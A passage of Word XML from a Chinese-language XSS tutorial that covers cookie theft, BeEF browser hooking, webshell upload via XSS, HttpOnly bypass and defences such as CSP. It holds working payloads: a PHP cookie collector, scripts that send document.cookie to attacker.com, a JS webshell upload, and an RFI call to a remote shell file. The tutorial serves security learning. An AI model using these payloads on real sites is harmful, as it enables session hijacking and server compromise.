        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 窃取 Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>经典攻击流程：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# 攻击者服务器端（如 attacker.com/steal.php）</w:t>
        <w:br/>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>$cookie = $_GET["cookie"];</w:t>
        <w:br/>
        <w:t>file_put_contents("cookies.txt", $cookie."\n", FILE_APPEND);</w:t>
        <w:br/>
        <w:t>?&gt;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# 构造 XSS Payload</w:t>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  var img = new Image();</w:t>
        <w:br/>
        <w:t xml:space="preserve">  img.src = "http://attacker.com/steal?cookie=" + document.cookie;</w:t>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># 或者用 HTML 方式</w:t>
        <w:br/>
        <w:t>&lt;img src="http://attacker.com/steal?cookie=" + document.cookie &gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>当受害者访问包含该 payload 的页面时，浏览器会向攻击者服务器发送一个带 Cookie 的请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 BeEF — 浏览器控制框架</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>BeEF（Browser Exploitation Framework）是 Kali Linux 上的一款工具，用于控制被 XSS 攻击的浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.1 基本使用步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>在 Kali 中启动 BeEF：beef-xss（默认UI端口3000，钩子端口3001）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>登录 BeEF 管理面板：http://your-kali-ip:3000/ui/panel （默认密码 beef/beef）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>BeEF 会生成一段 JS 脚本地址：http://your-kali-ip:3001/hook.js</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>在存在 XSS 的地方插入：&lt;script src="http://your-kali-ip:3001/hook.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>当受害者访问该页面时，浏览器就会被"钩住"，可以在 BeEF 面板中执行各种命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.2 BeEF 能做到的事情</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>获取浏览器信息（版本、插件、语言等）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>窃取 Cookie（即使带 HttpOnly，也能通过其他方式获取）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>键盘记录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>内网端口扫描（利用浏览器探测内网）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>自动表单填写/提交</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>钓鱼（弹出伪造的登录框）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>利用浏览器漏洞尝试提权到系统级别</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A5C8E"/>
        </w:rPr>
        <w:t>❓ BeEF 只能控制浏览器吗？能不能拿到系统权限？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2D6B2D"/>
        </w:rPr>
        <w:t>✅ 默认情况下 BeEF 控制的是浏览器层面（JS 沙箱内），无法直接获取系统 Shell。但是：</w:t>
        <w:br/>
        <w:t>① BeEF 集成了浏览器漏洞利用模块（Metasploit 配合），如果目标浏览器有未修复的漏洞，可以通过浏览器漏洞拿到系统权限。</w:t>
        <w:br/>
        <w:t>② 结合钓鱼页面（假装系统更新、需要安装插件等），诱导用户下载执行恶意程序。</w:t>
        <w:br/>
        <w:t>③ 在 BeEF 中可以使用 "Social Engineering" 模块伪装成软件更新弹窗。</w:t>
        <w:br/>
        <w:br/>
        <w:t>简单说：纯 XSS + BeEF 一般只控制浏览器；配合浏览器漏洞利用才能拿到系统权限。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 后门上传与 Webshell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A5C8E"/>
        </w:rPr>
        <w:t>❓ XSS 之后怎么上传后门？有没有实际例子？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2D6B2D"/>
        </w:rPr>
        <w:t>✅ 通过 XSS 上传后门通常有几种方式：</w:t>
        <w:br/>
        <w:br/>
        <w:t>方法一：利用站点本身的文件上传功能</w:t>
        <w:br/>
        <w:t>如果目标站有上传接口（如头像上传、文件附件等），可以通过 XSS 中的 JS 自动构造表单提交上传：</w:t>
        <w:br/>
        <w:br/>
        <w:t>var formData = new FormData();</w:t>
        <w:br/>
        <w:t>formData.append("file", new Blob(["&lt;?php system($_GET['cmd']); ?&gt;"], {type: "text/plain"}), "shell.php");</w:t>
        <w:br/>
        <w:t>fetch("/upload.php", { method: "POST", body: formData });</w:t>
        <w:br/>
        <w:br/>
        <w:t>方法二：通过 CSRF + XSS 组合（如果后台有文件上传功能）</w:t>
        <w:br/>
        <w:t>利用受害者的管理员权限，自动 POST 上传 webshell。</w:t>
        <w:br/>
        <w:br/>
        <w:t>方法三：通过文件包含漏洞</w:t>
        <w:br/>
        <w:t>如果站点有文件包含漏洞（LFI/RFI），XSS 可以触发访问包含恶意文件的 URL：</w:t>
        <w:br/>
        <w:t>new Image().src = "http://target.com/index.php?page=http://attacker.com/shell.txt";</w:t>
        <w:br/>
        <w:br/>
        <w:t>拿到 webshell 后用蚁剑（AntSword）、中国菜刀、冰蝎、哥斯拉等工具连接。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C0392B"/>
        </w:rPr>
        <w:t>⚠️ 安全提醒：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>⚠ 提醒：webshell 工具（如蚁剑、冰蝎等）本身可能是安全的，但从不明来源下载的工具可能内置了后门。建议从官方 GitHub 仓库下载，或自己写简单的 webshell。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>七、Cookie vs Session vs JWT 与 XSS 的关系</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 不同认证机制下的 XSS 危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>【Session + Cookie 认证】</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie 中存 Session ID，通过 document.cookie 可获取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>如果未设置 HttpOnly，XSS 可直接 steal Cookie → 伪造身份登录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>危害等级：⭐⭐⭐⭐⭐</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>【Token / JWT 认证】</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>Token 通常存储在 localStorage 或 sessionStorage 中</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>JS 可通过 localStorage.getItem("token") 或 sessionStorage.getItem("token") 获取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>XSS 同样可以读取并发送到攻击者服务器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>危害等级：⭐⭐⭐⭐⭐（与 Cookie 无异）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C0392B"/>
        </w:rPr>
        <w:t>⚠️ 误区提醒：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>注意：很多人以为用了 JWT 就能防 XSS，这是误区。只要 JS 能访问到 Token，XSS 就能偷。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>【仅 Session 验证（无 Cookie）】</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>如果 Session ID 放在 URL 参数或 POST body 中传递，XSS 同样可以拦截请求获取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 那现在的 XSS 还能干什么？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A5C8E"/>
        </w:rPr>
        <w:t>❓ 如果网站用了 JWT 令牌验证，XSS 还能做什么？除了上传后门外？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2D6B2D"/>
        </w:rPr>
        <w:t>✅ 好问题！即使有 JWT，XSS 能干的事仍然很多：</w:t>
        <w:br/>
        <w:br/>
        <w:t>① 窃取 Token — 直接拿到你的登录凭证，冒充你操作所有功能</w:t>
        <w:br/>
        <w:t>② 操作 CSRF — 以你的身份发帖、转账、修改密码（如果修改密码不需要旧密码验证）</w:t>
        <w:br/>
        <w:t>③ 数据窃取 — 用 fetch/ajax 请求 API 获取你的个人信息、订单、通讯录等</w:t>
        <w:br/>
        <w:t>④ 钓鱼 — 弹出伪造的登录框，诱导输入账号密码</w:t>
        <w:br/>
        <w:t>⑤ 键盘记录 — 记录你输入的所有内容</w:t>
        <w:br/>
        <w:t>⑥ 内网渗透 — 用浏览器扫描内网，攻击同内网的其他服务</w:t>
        <w:br/>
        <w:t>⑦ 篡改页面 — 修改页面显示内容，伪造交易信息</w:t>
        <w:br/>
        <w:t>⑧ 挖矿脚本 — 在后台运行加密货币挖矿脚本（消耗CPU）</w:t>
        <w:br/>
        <w:br/>
        <w:t>一句话：只要浏览器能做的事，XSS 都能做。认证机制只是保护了"登录"这一环，而 XSS 控制的是你登录后的整个浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>八、HttpOnly 及绕过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 什么是 HttpOnly？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>HttpOnly 是 Cookie 的一个属性标志。当 Cookie 设置了 HttpOnly 后，浏览器禁止 JavaScript 通过 document.cookie 读取该 Cookie。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>作用：防止 XSS 攻击直接窃取 Cookie（Session ID）。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Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure; SameSite=Lax</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.2 有 HttpOnly 就安全了吗？不完全</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>HttpOnly 只保护了 Cookie 不被 JS 读取，但 XSS 仍然可以做以下事情绕过或利用：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.3 HttpOnly 的绕过/利用方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>方法一：直接发送请求（不需要读取 Cookie）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>浏览器会在发送请求时自动带上 Cookie（即使 HttpOnly）。攻击者只需要发请求即可：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// 不需要读取 cookie，浏览器自动带</w:t>
        <w:br/>
        <w:t>fetch("/api/change_password", {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  method: "POST",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  body: "newpass=123456&amp;confirm=123456",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  credentials: "include"</w:t>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>这样攻击者以受害者的身份直接修改密码，根本不需要知道 Cookie 的值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>方法二：CSRF 风格的利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>通过 XSS 构造表单提交、Ajax 请求等，完全绕过 HttpOnly。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>方法三：获取页面中的敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>如果页面中直接渲染了敏感信息（如用户手机号、邮箱、余额等），XSS 可以直接读取页面 DOM 获取这些数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>方法四：结合其他漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>如果找到站点的 XSS 加上 CSRF 组合，可以修改用户的 Cookie 设置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>如果能获取到服务器的 Cookie 生成算法，可以伪造 Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>方法五：绕过 HttpOnly 的高级技巧</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>有些浏览器或特定版本的漏洞可以绕过 HttpOnly，但这在现代浏览器中比较少见。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C0392B"/>
        </w:rPr>
        <w:t>💡 结论：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>总结：HttpOnly 不是万能的。它防住了"偷 Cookie"这一个点，但防不住 CSRF 式操作、页面数据窃取、键盘记录等。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>九、XSS 防御建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>作为安全学习者，不仅要会攻击，更要懂防御。以下是核心防御措施：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1 输入过滤（Input Validation）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>对用户提交的数据进行白名单过滤，只允许合法字符</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>去掉危险的 HTML 标签和属性</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2 输出转义（Output Encoding）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>HTML 上下文：&lt; → &amp;lt;，&gt; → &amp;gt;，" → &amp;quot;，' → &amp;#39;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>JavaScript 上下文：使用 JSON.stringify 安全序列化，不要直接拼接字符串</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>URL 上下文：使用 encodeURI / encodeURIComponent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3 使用安全框架</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>React / Vue / Angular 等现代框架默认对插值做了转义</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>谨慎使用 v-html / dangerouslySetInnerHTML 等跳过转义的 API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4 设置安全 Header</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Security-Policy（CSP）— 限制可加载的资源来源</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>X-XSS-Protection（虽然已废弃，但有些老旧系统还有用）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>Set-Cookie 中加入 HttpOnly、Secure、SameSite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5 HttpOnly + CSP 配合使用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:left="567"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CSP 示例：</w:t>
        <w:br/>
        <w:t>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123';</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>即使 XSS 注入成功，如果 CSP 限制了只能加载本站的脚本，攻击者的外联脚本将无法执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>附录：XSS 学习路线推荐</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>按以下顺序学习，循序渐进：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段一：基础原理（当前阶段 ✅）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>理解三类 XSS 的原理和区别</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>能在本地靶场（DVWA、Pikachu、XSS-Labs）复现三种类型</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>掌握基础 Payload 编写</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段二：手工测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>学会查看网页源代码判断过滤情况</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>掌握不同上下文（HTML/属性/JS/URL）的测试方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>使用浏览器 F12 调试工具分析 DOM 操作</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段三：绕过技巧</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>掌握大小写、双写、编码、标签替换等绕过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>了解常见 WAF 的绕过思路</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>多刷 XSS-Labs 靶场</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段四：工具辅助</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite 抓包 + Repeater 测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>BeEF 浏览器控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>XSS Hunter / 自己的服务器接收数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段五：实战综合</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>结合 CSRF 进行组合攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>XSS + 内网渗透思路</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>挖掘 SRC（安全响应中心）中的 XSS 漏洞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C8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